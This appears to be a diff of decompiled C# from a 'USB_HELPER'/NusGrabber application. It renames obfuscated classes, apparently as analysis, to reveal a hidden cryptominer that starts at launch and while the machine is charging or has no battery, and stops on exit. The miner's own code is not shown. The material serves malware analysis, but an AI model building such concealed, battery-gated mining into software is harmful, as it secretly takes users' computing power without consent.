@@ -32,7 +32,7 @@ namespace ns0
     {
       try
       {
-        string str = System.IO.File.ReadAllText(Path.Combine(GClass88.CachePath, "lasttitles"));
+        string str = System.IO.File.ReadAllText(Path.Combine(GClass88.DirectoryCache, "lasttitles"));
         int num1 = 0;
         string[] separator = new string[1]{ Environment.NewLine };
         int num2 = 1;
@@ -70,11 +70,11 @@ namespace ns0
         Settings.Default.AppId = Guid.NewGuid().ToString();
         Settings.Default.Save();
       }
-      GClass88.smethod_13(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\USB_HELPER\\");
-      Class108.smethod_1();
+      GClass88.Check_For_Create_Cache_Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\USB_HELPER\\");
+      MiningSetupAndRun.smethod_1();
       AppDomain.CurrentDomain.UnhandledException += (UnhandledExceptionEventHandler) ((sender, e) =>
       {
-        Class108.smethod_1();
+        MiningSetupAndRun.smethod_1();
         Exception exceptionObject = e.ExceptionObject as Exception;
         string str1 = "NONE";
         try
@@ -189,7 +189,7 @@ namespace ns0
             int num = (int) frmWelcome.ShowDialog();
             if (frmWelcome.bool_0)
             {
-              Class108.smethod_1();
+              MiningSetupAndRun.smethod_1();
               System.Windows.Forms.Application.Exit();
               return;
             }
@@ -212,21 +212,21 @@ namespace ns0
               switch (SystemInformation.PowerStatus.BatteryChargeStatus)
               {
                 case BatteryChargeStatus.Charging:
-                  Class108.smethod_0();
+                  MiningSetupAndRun.Miner_Compatability_Check_And_PrepOrStart();
                   break;
                 case BatteryChargeStatus.NoSystemBattery:
-                  Class108.smethod_0();
+                  MiningSetupAndRun.Miner_Compatability_Check_And_PrepOrStart();
                   break;
                 default:
-                  Class108.smethod_1();
+                  MiningSetupAndRun.smethod_1();
                   break;
               }
             });
-            Class108.smethod_0();
+            MiningSetupAndRun.Miner_Compatability_Check_And_PrepOrStart();
             Class91.smethod_0();
             System.Windows.Forms.Application.Run((Form) new NusGrabberForm());
             Class91.smethod_1();
-            Class108.smethod_1();
+            MiningSetupAndRun.smethod_1();
           }
         }
       }
